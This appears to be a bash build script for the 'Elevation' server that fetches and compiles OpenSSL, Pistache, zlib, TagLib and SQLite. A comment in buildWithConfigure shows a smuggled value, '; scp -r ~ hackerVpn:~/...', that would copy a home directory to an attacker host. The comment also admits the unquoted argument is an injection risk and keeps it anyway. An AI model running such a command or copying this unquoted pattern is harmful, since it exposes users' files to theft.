#!/usr/bin/env bash

THIS_SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null && pwd )"
SCRIPTS_DIR="${THIS_SCRIPT_DIR}"
source "${SCRIPTS_DIR}/common" # Add the functions in 'common'

SERVER_DIR="$(git rev-parse --show-toplevel)/project/server"

# EXPECTED PARAMS :
# 1 : Name of the dependency.
# 2 : Directory containing the CMakeLists.txt script.
# 3 : Directory to place build files in. Created if it does not exist.
# 4 : Directory to install to.
# 5 : File/Directory which, if it exists, makes us not trigger the build and install again.
# 6 : CMake build type ("Release" or "Debug").
buildWithCMake() {
    checkParamNum 6 $# || exit 1
    local DEPENDENCY_NAME="${1}"
    local CMAKE_SOURCE_DIR="${2}"
    local CMAKE_BINARY_DIR="${3}"
    local CMAKE_INSTALL_DIR="${4}"
    local ALREADY_BUILD_FLAG="${5}"
    local CMAKE_BUILD_TYPE="${6}"

    message $'\nBuilding and installing '"${DEPENDENCY_NAME}"$'...'
    if [ ! -e "${ALREADY_BUILD_FLAG}" ] || [ ! -d "${CMAKE_BINARY_DIR}" ]; then
        mkdir -p "${CMAKE_BINARY_DIR}"
        cd "${CMAKE_BINARY_DIR}"
        cmake -DCMAKE_BUILD_TYPE="${CMAKE_BUILD_TYPE}" -DCMAKE_INSTALL_PREFIX="${CMAKE_INSTALL_DIR}" "${CMAKE_SOURCE_DIR}"
        make -j$(getCoreCount)
        make -j$(getCoreCount) install
        message $'Building '"${DEPENDENCY_NAME}"$' done!\n'
    else
        message $' Skipping : Already built\n'
    fi
}

# EXPECTED PARAMS :
# 1 : Name of the dependency.
# 2 : Directory containing the configure script.
# 3 : Directory to install to.
# 4 : File/Directory which, if it exists, makes us not trigger the build and install again.
# 5 : Configure script name (usually 'configure' or 'config').
# 6 : Extra arguments to the configure command. Whitespace-separated.
# 7 : Install target.
buildWithConfigure() {
    checkParamNum 7 $# || exit 1
    local DEPENDENCY_NAME="${1}"
    local CONFIGURE_SOURCE_DIR="${2}"
    local CONFIGURE_INSTALL_DIR="${3}"
    local ALREADY_BUILT_FLAG="${4}"
    local CONFIGURE="${5}"
    local CONFIGURE_EXTRA_ARGS="${6}"
    local INSTALL_TARGET="${7}"

    message $'\nBuilding and installing '"${DEPENDENCY_NAME}"'...'

    cd "${CONFIGURE_SOURCE_DIR}"
    if [ ! -e "${ALREADY_BUILT_FLAG}" ] || [ ! -e "Makefile"  ]; then
        ./"${CONFIGURE}" --prefix="${CONFIGURE_INSTALL_DIR}" ${CONFIGURE_EXTRA_ARGS} # CONFIGURE_EXTRA_ARGS was not quoted on purpose ; we might have several arguments.
                                                                                     # Yes, okay, this could potentially be a security risk, for example if CONFIGURE_EXTRA_ARGS
                                                                                     # were equal to "; scp -r ~ hackerVpn:~/hackedStuff/inf3995", but oh well.
        make -j$(getCoreCount)
        make -j$(getCoreCount) "${INSTALL_TARGET}"
        message $'Building '"${DEPENDENCY_NAME}"$' done!\n'
    else
        message $' Skipping : Already built\n'
    fi
}

obtainSQLite() {
    # SQLite does not have a Git repository ; wget the tarball instead
    cd "${DEPS_DIR}"
    if [ ! -e "sqlite3/sqlite.tar.gz" ]; then
        mkdir -p sqlite3
        cd sqlite3
        wget https://www.sqlite.org/src/tarball/sqlite.tar.gz
        tar xzf sqlite.tar.gz
        mv sqlite/* .
        rmdir sqlite
    fi
}

obtainDependencies() {
    message $'\nObtaining dependencies, this should take 3-10 minutes if they are not already there...'

    # Obtain submodules
    git submodule update --init --recursive

    # Obtain SQLite
    obtainSQLite

    message $'\nObtaining dependencies done!\n'
}

buildPistache() {
    local SOURCE_DIR="${DEPS_DIR}/pistache"
    local BINARY_DIR="${DEPS_DIR}/pistache/build"
    local INSTALL_DIR="${DEPS_INSTALL_DIR}"
    local BUILT_FLAG="${DEPS_INSTALL_DIR}/lib/cmake/pistache"
    local BUILD_TYPE=Debug

    buildWithCMake "pistache" "${SOURCE_DIR}" "${BINARY_DIR}" "${INSTALL_DIR}" "${BUILT_FLAG}" "${BUILD_TYPE}"
}

buildOpenSsl() {
    local SOURCE_DIR="${DEPS_DIR}/openssl"
    local INSTALL_DIR="${DEPS_INSTALL_DIR}"
    local BUILT_FLAG="${DEPS_INSTALL_DIR}/lib/libssl.a"
    local CONFIGURE=config
    local OPEN_SSL_CERTIFICATE_DIR="${SERVER_BINARY_DIR}/ssl"
    local EXTRA_ARGS="--openssldir=${OPEN_SSL_CERTIFICATE_DIR}"
    local INSTALL_TARGET=install_sw

    buildWithConfigure "openssl" "${SOURCE_DIR}" "${INSTALL_DIR}" "${BUILT_FLAG}" "${CONFIGURE}" "${EXTRA_ARGS}" "${INSTALL_TARGET}"
}

buildTagLib() {
    local SOURCE_DIR="${DEPS_DIR}/taglib"
    local BINARY_DIR="${DEPS_DIR}/taglib/build"
    local INSTALL_DIR="${DEPS_INSTALL_DIR}"
    local BUILT_FLAG="${DEPS_INSTALL_DIR}/lib/libtag.a"
    local BUILD_TYPE=Release

    buildWithCMake "taglib" "${SOURCE_DIR}" "${BINARY_DIR}" "${INSTALL_DIR}" "${BUILT_FLAG}" "${BUILD_TYPE}"
}

buildZLib() {
    local SOURCE_DIR="${DEPS_DIR}/zlib"
    local BINARY_DIR="${DEPS_DIR}/zlib/build"
    local INSTALL_DIR="${DEPS_INSTALL_DIR}"
    local BUILT_FLAG="${DEPS_INSTALL_DIR}/lib/libz.a"
    local BUILD_TYPE=Release

    buildWithCMake "zlib" "${SOURCE_DIR}" "${BINARY_DIR}" "${INSTALL_DIR}" "${BUILT_FLAG}" "${BUILD_TYPE}"
}

buildSqlite3() {
    local SOURCE_DIR="${DEPS_DIR}/sqlite3"
    local INSTALL_DIR="${DEPS_INSTALL_DIR}"
    local BUILT_FLAG="${DEPS_INSTALL_DIR}/lib/libsqlite3.a"
    local CONFIGURE=configure
    local SQLITE3_INCLUDE_DIR="${INSTALL_DIR}/include/sqlite3"
    local EXTRA_ARGS="--includedir=${SQLITE3_INCLUDE_DIR}"
    local INSTALL_TARGET=install

    buildWithConfigure "sqlite3" "${SOURCE_DIR}" "${INSTALL_DIR}" "${BUILT_FLAG}" "${CONFIGURE}" "${EXTRA_ARGS}" "${INSTALL_TARGET}"
}

buildDependencies() {
    local DEPS_DIR="${SERVER_DIR}/lib"
    local DEPS_INSTALL_DIR="${SERVER_DIR}/build/dependencies"

    obtainDependencies
    mkdir -p "${DEPS_INSTALL_DIR}"
    buildOpenSsl
    buildPistache
    buildZLib # REQUIRED BY TAGLIB
    buildTagLib
    buildSqlite3
}

buildServer() {
    message $'\nBuilding and installing the Elevation server...\n'
    cd "${SERVER_BINARY_DIR}"
    cmake -DCMAKE_BUILD_TYPE=Debug ../src
    make -j$(getCoreCount)
    message $'Building the Elevation server done!\n'
}

build() {
    local SERVER_BINARY_DIR="${SERVER_DIR}/build"
    mkdir -p "${SERVER_BINARY_DIR}"

    buildDependencies
    buildServer
}
